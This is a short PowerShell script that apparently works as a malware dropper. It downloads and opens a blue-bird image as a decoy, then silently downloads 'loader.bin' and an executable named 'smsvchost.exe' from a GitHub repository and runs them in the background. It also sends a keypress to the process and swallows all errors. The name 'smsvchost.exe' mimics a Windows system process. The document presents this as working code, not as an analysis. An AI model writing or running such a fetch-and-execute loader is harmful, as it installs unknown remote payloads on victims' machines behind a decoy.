try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"

    # Download loader.bin
    $loaderUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/loader.bin"
    $loaderPath = "$env:TEMP\loader.bin"
    Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath

    # Download smsvchost.exe
    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/smsvchost.exe"
    $smsvchostPath = "$env:TEMP\smsvchost.exe"
    Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath

    # Run smsvchost.exe with loader.bin as an argument in the background
    $process = Start-Process -FilePath $smsvchostPath -ArgumentList $loaderPath -NoNewWindow -PassThru

    # Wait for 1 second
    Start-Sleep -Seconds 1

    # Send the Enter key to the process
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.SendKeys("~")  # "~" is the symbol for the Enter key

    # Write-Host "Process executed successfully in the background."
}
catch {
    # Write-Host "An error occurred: $_"
}